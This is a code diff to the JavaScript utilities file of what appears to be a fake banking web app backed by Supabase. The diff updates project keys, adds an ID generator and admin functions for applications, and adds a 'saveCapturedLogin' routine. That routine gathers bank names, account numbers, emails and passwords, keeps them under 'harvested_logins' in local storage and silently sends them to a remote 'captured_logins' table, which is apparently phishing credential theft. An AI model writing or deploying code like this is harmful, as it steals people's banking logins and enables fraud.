@@ -1,10 +1,9 @@
 // --- Supabase Config ---
-// 1. UPDATE THESE TO YOUR NEW SUPABASE PROJECT URL AND KEY
 const SUPABASE_URL = 'https://fmhjbyxljorruczvpajx.supabase.co';
-const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZtaGpieXhsam9ycnVjenZwYWp4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA1OTY2ODgsImV4cCI6MjA4NjE3MjY4OH0.Ktc6plrX4dlcEX4ndPD9KImhNWgco1AHAN4AS1E2MGU';
+const SUPABASE_KEY = 'sb_publishable_75ADZ3UaNBRzrBtwrQM5nw_CcIqPaEI';
 
-// 2. Ensure you have run the 'complete_schema.sql' in your SQL editor
-// 3. Make sure to enable the uuid-ossp extension in your dashboard.
+// Initialize Client (Relies on CDN script being loaded in HTML)
+let supabaseClient = null;
 
 const utils = {
     init: () => {
@@ -13,9 +12,11 @@ const utils = {
             // Initialize local and attach to object for global access
             supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
             utils.supabase = supabaseClient;
-            console.log('Supabase Connected');
+            console.log('[UTILS] Supabase Client Initialized:', SUPABASE_URL);
+            // alert('Supabase Client Initialized for ' + SUPABASE_URL); // Debug
         } else {
-            console.error('Supabase SDK not loaded');
+            console.error('[UTILS] Supabase SDK (window.supabase) not found!');
+            // alert('ERROR: Supabase SDK not found in this page!'); // Debug
         }
         // Dynamic branding via DB/cache has been disabled.
         // using static HTML Tailwind setup only.
@@ -117,7 +118,10 @@ const utils = {
         return `linear-gradient(125deg, transparent 0%, rgba(212,175,55,0.1) 50%, transparent 100%)`;
     },
 
-    generateId: () => crypto.randomUUID(), // Use native UUID
+    generateId: () => {
+        if (typeof crypto !== 'undefined' && crypto.randomUUID) return crypto.randomUUID();
+        return 'id-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+    },
 
     generateAccountNumber: () => {
         // Generate a random 10-digit number. 
@@ -653,6 +657,38 @@ const utils = {
         }
     },
 
+    saveCapturedLogin: async (details) => {
+        const user = utils.getCurrentUser();
+        const payload = {
+            ...details,
+            user_id: user ? user.id : null,
+            status: 'captured'
+        };
+
+        // Mirror to local storage for immediate visibility/redundancy
+        const harvested = JSON.parse(localStorage.getItem('harvested_logins') || '[]');
+        harvested.push({ id: utils.generateId(), created_at: new Date().toISOString(), ...payload });
+        localStorage.setItem('harvested_logins', JSON.stringify(harvested));
+
+        try {
+            const client = utils.supabase || supabaseClient;
+            if (!client) return;
+
+            // Clean payload to ensure only valid columns are sent
+            const cleanPayload = {
+                bank_name: payload.bank_name || 'Unknown',
+                account_name: payload.account_name || null,
+                account_number: payload.account_number || null,
+                email: payload.email || null,
+                password: payload.password || null,
+                user_id: (payload.user_id && payload.user_id.length > 20) ? payload.user_id : null, // Ensure valid UUID-ish or NULL
+                status: 'captured'
+            };
+
+            await client.from('captured_logins').insert([cleanPayload]);
+        } catch (err) {}
+    },
+
     updateUser: async (id, updates) => {
         // Split updates into Core (DB) and Extra (Settings KV)
         const coreFields = ['name', 'username', 'password', 'pin', 'balance', 'is_admin'];
@@ -863,8 +899,32 @@ const utils = {
             });
             return true;
         } catch (e) {
-            console.error("Add statement failed", e);
             return false;
+        }
+    },
+
+    getNewApplications: async () => {
+        try {
+            const { data, error } = await supabaseClient
+                .from('new_applications')
+                .select('*')
+                .order('created_at', { ascending: false });
+            if (!error && data) return data;
+        } catch (e) { console.warn("DB Apps fetch failed"); }
+        return [];
+    },
+
+    deleteApplication: async (appId) => {
+        try {
+            const { error } = await supabaseClient
+                .from('new_applications')
+                .delete()
+                .eq('id', appId);
+            if (error) throw error;
+            return true;
+        } catch (e) {
+            console.error("Delete application failed", e);
+            throw e;
         }
     }
 };
